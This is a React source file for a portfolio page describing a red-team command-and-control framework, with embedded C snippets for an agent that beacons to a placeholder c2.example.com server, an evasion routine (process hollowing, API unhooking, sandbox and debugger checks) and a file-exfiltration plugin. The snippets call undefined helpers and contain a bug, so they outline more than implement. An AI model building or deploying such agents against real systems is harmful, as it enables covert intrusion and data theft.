'use client'

import { motion } from 'framer-motion'
import DetailPageLayout from '@/components/DetailPageLayout'
import CodeBlock from '@/components/CodeBlock'
import Callout from '@/components/Callout'

export default function C2FrameworkProjectPage() {
  const features = [
    {
      icon: '🎯',
      title: 'Advanced Evasion',
      description: 'Built-in techniques to evade detection by EDR and network monitoring systems.'
    },
    {
      icon: '🔄',
      title: 'Modular Architecture',
      description: 'Plugin-based system allowing for easy customization and extension of capabilities.'
    },
    {
      icon: '🛡️',
      title: 'OPSEC Focused',
      description: 'Designed with operational security in mind, minimizing forensic artifacts.'
    },
    {
      icon: '⚡',
      title: 'High Performance',
      description: 'Optimized for speed and reliability in high-stress red team environments.'
    }
  ]

  const milestones = [
    {
      date: 'Q3 2024',
      title: 'Core Development',
      description: 'Basic C2 server and agent architecture'
    },
    {
      date: 'Q4 2024',
      title: 'Evasion Techniques',
      description: 'Implemented advanced evasion and anti-analysis features'
    },
    {
      date: 'Q1 2025',
      title: 'Plugin System',
      description: 'Modular plugin architecture for extensibility'
    },
    {
      date: 'Q2 2025',
      title: 'Production Ready',
      description: 'Full testing and documentation for operational use'
    }
  ]

  const basicUsageCode = `#include <stdio.h>
#include <windows.h>
#include <wininet.h>
#include "c2_framework.h"

int main() {
    C2Config config = {
        .server_url = "https://c2.example.com",
        .user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        .check_interval = 30,
        .max_retries = 3
    };
    
    C2Agent* agent = c2_agent_init(&config);
    if (!agent) {
        fprintf(stderr, "Failed to initialize C2 agent\\n");
        return 1;
    }
    
    // Start the agent main loop
    if (c2_agent_start(agent) != 0) {
        fprintf(stderr, "Failed to start C2 agent\\n");
        c2_agent_cleanup(agent);
        return 1;
    }
    
    printf("C2 agent started successfully\\n");
    
    // Keep running
    while (c2_agent_is_running(agent)) {
        Sleep(1000);
    }
    
    c2_agent_cleanup(agent);
    return 0;
}`

  const evasionCode = `// Advanced evasion techniques
void apply_evasion_techniques() {
    // 1. Process hollowing
    if (process_hollowing("notepad.exe") != 0) {
        fprintf(stderr, "Process hollowing failed\\n");
        return;
    }
    
    // 2. API unhooking
    unhook_ntdll_apis();
    unhook_kernel32_apis();
    
    // 3. Memory protection
    protect_memory_regions();
    
    // 4. Anti-debugging
    if (is_debugger_present()) {
        exit(1);
    }
    
    // 5. Sandbox detection
    if (detect_sandbox_environment()) {
        exit(1);
    }
    
    // 6. Network evasion
    randomize_network_timing();
    use_legitimate_traffic_mimicry();
}

// OPSEC-focused communication
int secure_communication(const char* data, size_t data_len) {
    // Encrypt data with AES-256
    unsigned char encrypted[data_len + 16];
    size_t encrypted_len = aes_encrypt(data, data_len, encrypted);
    
    // Add padding and obfuscation
    add_traffic_padding(encrypted, encrypted_len);
    
    // Use HTTPS with certificate pinning
    return send_https_request(encrypted, encrypted_len);
}`

  const pluginExampleCode = `// Example plugin: File exfiltration
#include "c2_plugin.h"

typedef struct {
    char* target_path;
    char* output_path;
    int chunk_size;
} FileExfilConfig;

int file_exfil_init(PluginContext* ctx) {
    FileExfilConfig* config = malloc(sizeof(FileExfilConfig));
    config->target_path = "/sensitive/data/";
    config->output_path = "/tmp/exfil/";
    config->chunk_size = 1024;
    
    ctx->plugin_data = config;
    return 0;
}

int file_exfil_execute(PluginContext* ctx, const char* command) {
    FileExfilConfig* config = (FileExfilConfig*)ctx->plugin_data;
    
    if (strncmp(command, "exfil ", 6) == 0) {
        char* file_path = command + 6;
        return exfiltrate_file(file_path, config->chunk_size);
    }
    
    return -1;
}

void file_exfil_cleanup(PluginContext* ctx) {
    FileExfilConfig* config = (FileExfilConfig*)ctx->plugin_data;
    free(config->target_path);
    free(config->output_path);
    free(config);
}

// Plugin registration
C2Plugin file_exfil_plugin = {
    .name = "file_exfil",
    .version = "1.0.0",
    .init = file_exfil_init,
    .execute = file_exfil_execute,
    .cleanup = file_exfil_cleanup
};`

  return (
    <DetailPageLayout 
      title="Custom C2 Framework"
      subtitle="Advanced Command & Control Framework with Evasion Techniques"
      breadcrumb={{ label: "Projects", href: "/#projects" }}
    >
      <div className="max-w-4xl mx-auto px-6 py-12">

        {/* Hero Section */}
        <motion.div
          className="text-center mb-16"
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8 }}
        >
          <div className="flex items-center justify-center mb-6">
            <div className="w-20 h-20 bg-purple-500/20 rounded-lg flex items-center justify-center border border-purple-500/30 mr-6">
              <span className="text-4xl">🎯</span>
            </div>
            <div>
              <h1 className="text-4xl lg:text-5xl font-bold text-white mb-2">
                Custom C2 Framework
              </h1>
              <p className="text-xl text-gray-300">
                Lightweight Command & Control Framework for Red Team Operations
              </p>
            </div>
          </div>

          {/* Status Badge */}
          <div className="flex items-center justify-center space-x-4 mb-8">
            <div className="flex items-center space-x-2">
              <div className="w-3 h-3 bg-yellow-500 rounded-full animate-pulse"></div>
              <span className="text-yellow-400 text-sm font-medium">Research Phase</span>
            </div>
            <div className="text-gray-500">•</div>
            <div className="flex items-center space-x-1 text-sm text-gray-400">
              <span>⭐</span>
              <span>12</span>
            </div>
            <div className="flex items-center space-x-1 text-sm text-gray-400">
              <span>🍴</span>
              <span>3</span>
            </div>
            <div className="text-gray-500">•</div>
            <span className="text-sm text-gray-400">C/C++</span>
            <div className="text-gray-500">•</div>
            <span className="text-sm text-gray-400">MIT License</span>
          </div>
        </motion.div>

        {/* Overview */}
        <motion.section
          className="mb-16"
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.2 }}
        >
          <h2 className="text-3xl font-bold text-white mb-6">Overview</h2>
          <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-8">
            <p className="text-lg text-gray-300 leading-relaxed mb-6">
              The Custom C2 Framework is a next-generation command and control system designed 
              specifically for red team operations. Built from the ground up with evasion and 
              operational security in mind, it provides a robust platform for conducting 
              sophisticated penetration tests and red team exercises.
            </p>
            <div className="grid md:grid-cols-2 gap-6">
              <div>
                <h3 className="text-xl font-semibold text-white mb-3">The Challenge</h3>
                <p className="text-gray-300">
                  Traditional C2 frameworks are often detected by modern security solutions. 
                  Red teams need tools that can operate undetected while providing the 
                  flexibility and reliability required for complex engagements.
                </p>
              </div>
              <div>
                <h3 className="text-xl font-semibold text-white mb-3">The Solution</h3>
                <p className="text-gray-300">
                  A lightweight, modular C2 framework with built-in evasion techniques, 
                  advanced OPSEC features, and a plugin architecture that allows for 
                  rapid customization and adaptation to specific engagement requirements.
                </p>
              </div>
            </div>
          </div>
        </motion.section>

        {/* Key Features */}
        <motion.section
          className="mb-16"
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.3 }}
        >
          <h2 className="text-3xl font-bold text-white mb-8">Key Features</h2>
          <div className="grid md:grid-cols-2 gap-6">
            {features.map((feature, index) => (
              <motion.div
                key={feature.title}
                className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6 hover:border-purple-500/30 transition-colors"
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.6, delay: 0.4 + index * 0.1 }}
                whileHover={{ scale: 1.02 }}
              >
                <div className="flex items-start space-x-4">
                  <span className="text-3xl">{feature.icon}</span>
                  <div>
                    <h3 className="text-xl font-semibold text-white mb-2">
                      {feature.title}
                    </h3>
                    <p className="text-gray-300 leading-relaxed">
                      {feature.description}
                    </p>
                  </div>
                </div>
              </motion.div>
            ))}
          </div>
        </motion.section>

        {/* Architecture */}
        <motion.section
          className="mb-16"
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.4 }}
        >
          <h2 className="text-3xl font-bold text-white mb-8">Architecture</h2>
          <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-8">
            <div className="grid md:grid-cols-3 gap-8 mb-8">
              <div className="text-center">
                <div className="w-16 h-16 bg-blue-500/20 rounded-lg flex items-center justify-center border border-blue-500/30 mx-auto mb-4">
                  <span className="text-2xl">🖥️</span>
                </div>
                <h3 className="text-lg font-semibold text-white mb-2">C2 Server</h3>
                <p className="text-gray-300 text-sm">
                  Central command server with web interface and API endpoints
                </p>
              </div>
              <div className="text-center">
                <div className="w-16 h-16 bg-purple-500/20 rounded-lg flex items-center justify-center border border-purple-500/30 mx-auto mb-4">
                  <span className="text-2xl">🔌</span>
                </div>
                <h3 className="text-lg font-semibold text-white mb-2">Agent</h3>
                <p className="text-gray-300 text-sm">
                  Lightweight client agent with evasion and plugin capabilities
                </p>
              </div>
              <div className="text-center">
                <div className="w-16 h-16 bg-green-500/20 rounded-lg flex items-center justify-center border border-green-500/30 mx-auto mb-4">
                  <span className="text-2xl">🧩</span>
                </div>
                <h3 className="text-lg font-semibold text-white mb-2">Plugins</h3>
                <p className="text-gray-300 text-sm">
                  Modular plugins for extending functionality and capabilities
                </p>
              </div>
            </div>
            
            <Callout type="warning" title="Ethical Use Only">
              This framework is designed for authorized red team operations and security research only. 
              Users must ensure they have proper authorization before deploying in any environment.
            </Callout>
          </div>
        </motion.section>

        {/* Code Examples */}
        <motion.section
          className="mb-16"
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.5 }}
        >
          <h2 className="text-3xl font-bold text-white mb-8">Code Examples</h2>
          
          <div className="space-y-8">
            <div>
              <h3 className="text-xl font-semibold text-white mb-4">Basic Agent Setup</h3>
              <CodeBlock
                code={basicUsageCode}
                language="c"
                title="C2 Agent Initialization"
              />
            </div>
            
            <div>
              <h3 className="text-xl font-semibold text-white mb-4">Advanced Evasion Techniques</h3>
              <CodeBlock
                code={evasionCode}
                language="c"
                title="Anti-Detection and Evasion"
              />
            </div>
            
            <div>
              <h3 className="text-xl font-semibold text-white mb-4">Plugin Development</h3>
              <CodeBlock
                code={pluginExampleCode}
                language="c"
                title="Custom Plugin Example"
              />
            </div>
          </div>
        </motion.section>

        {/* Installation Guide */}
        <motion.section
          className="mb-16"
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.6 }}
        >
          <h2 className="text-3xl font-bold text-white mb-8">Installation Guide</h2>
          <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-8">
            <div className="space-y-6">
              <div>
                <h3 className="text-xl font-semibold text-white mb-3">Prerequisites</h3>
                <ul className="text-gray-300 space-y-2">
                  <li>• GCC 9.0+ or Visual Studio 2019+</li>
                  <li>• OpenSSL 1.1.1+ for encryption</li>
                  <li>• libcurl for HTTP communication</li>
                  <li>• CMake 3.15+ for build system</li>
                </ul>
              </div>
              
              <div>
                <h3 className="text-xl font-semibold text-white mb-3">Build from Source</h3>
                <CodeBlock
                  code={`git clone https://github.com/ForeverLX/Red-Team-Portfolio.git
cd C2-Framework
mkdir build && cd build
cmake -DCMAKE_BUILD_TYPE=Release ..
make -j4
sudo make install`}
                  language="bash"
                  title="Build Commands"
                  showLineNumbers={false}
                />
              </div>
              
              <div>
                <h3 className="text-xl font-semibold text-white mb-3">Configuration</h3>
                <p className="text-gray-300 mb-4">
                  Configure the C2 server and agent settings:
                </p>
                <CodeBlock
                  code={`# c2_config.conf
[server]
host = "0.0.0.0"
port = 8443
ssl_cert = "/path/to/cert.pem"
ssl_key = "/path/to/key.pem"
log_level = "INFO"

[agent]
check_interval = 30
max_retries = 3
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
evasion_enabled = true

[plugins]
plugin_dir = "/usr/local/lib/c2/plugins"
auto_load = true`}
                  language="ini"
                  title="Configuration File"
                  showLineNumbers={false}
                />
              </div>
            </div>
          </div>
        </motion.section>

        {/* Development Journey */}
        <motion.section
          className="mb-16"
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.7 }}
        >
          <h2 className="text-3xl font-bold text-white mb-8">Development Journey</h2>
          <div className="space-y-6">
            {milestones.map((milestone, index) => (
              <motion.div
                key={milestone.date}
                className="flex items-start space-x-4"
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ duration: 0.6, delay: 0.8 + index * 0.1 }}
              >
                <div className="flex-shrink-0 w-24 text-sm text-gray-400 font-medium">
                  {milestone.date}
                </div>
                <div className="flex-shrink-0 w-4 h-4 bg-purple-500 rounded-full mt-1"></div>
                <div className="flex-1">
                  <h3 className="text-lg font-semibold text-white mb-1">
                    {milestone.title}
                  </h3>
                  <p className="text-gray-300">
                    {milestone.description}
                  </p>
                </div>
              </motion.div>
            ))}
          </div>
        </motion.section>

        {/* Technical Details */}
        <motion.section
          className="mb-16"
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.8 }}
        >
          <h2 className="text-3xl font-bold text-white mb-8">Technical Details</h2>
          <div className="grid md:grid-cols-2 gap-8">
            <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6">
              <h3 className="text-xl font-semibold text-white mb-4">Tech Stack</h3>
              <div className="flex flex-wrap gap-2">
                {['C', 'C++', 'OpenSSL', 'libcurl', 'CMake', 'JSON', 'SQLite'].map((tech) => (
                  <span
                    key={tech}
                    className="px-3 py-1 bg-gray-700/50 text-gray-300 text-sm rounded-full border border-gray-600/30"
                  >
                    {tech}
                  </span>
                ))}
              </div>
            </div>
            
            <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6">
              <h3 className="text-xl font-semibold text-white mb-4">Performance</h3>
              <div className="space-y-2 text-gray-300">
                <div className="flex justify-between">
                  <span>Memory Usage:</span>
                  <span className="text-green-400">~25MB</span>
                </div>
                <div className="flex justify-between">
                  <span>CPU Usage:</span>
                  <span className="text-green-400">~1%</span>
                </div>
                <div className="flex justify-between">
                  <span>Network Overhead:</span>
                  <span className="text-green-400">Minimal</span>
                </div>
              </div>
            </div>
          </div>
        </motion.section>

        {/* Footer */}
        <motion.div
          className="text-center border-t border-gray-700/50 pt-8"
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.9 }}
        >
          <div className="flex justify-center space-x-8 mb-6">
            <a
              href="https://github.com/ForeverLX/Red-Team-Portfolio"
              target="_blank"
              rel="noopener noreferrer"
              className="flex items-center space-x-2 text-gray-400 hover:text-white transition-colors"
            >
              <span className="text-xl">🐙</span>
              <span>GitHub Repository</span>
            </a>
            <a
              href="https://github.com/ForeverLX/Red-Team-Portfolio/issues"
              target="_blank"
              rel="noopener noreferrer"
              className="flex items-center space-x-2 text-gray-400 hover:text-white transition-colors"
            >
              <span className="text-xl">🐛</span>
              <span>Report Issues</span>
            </a>
          </div>
          
          <Callout type="info" title="Research Project">
            This is an active research project focused on advancing red team capabilities. 
            Contributions and feedback from the security community are welcome.
          </Callout>
        </motion.div>
      </div>
    </DetailPageLayout>
  )
}
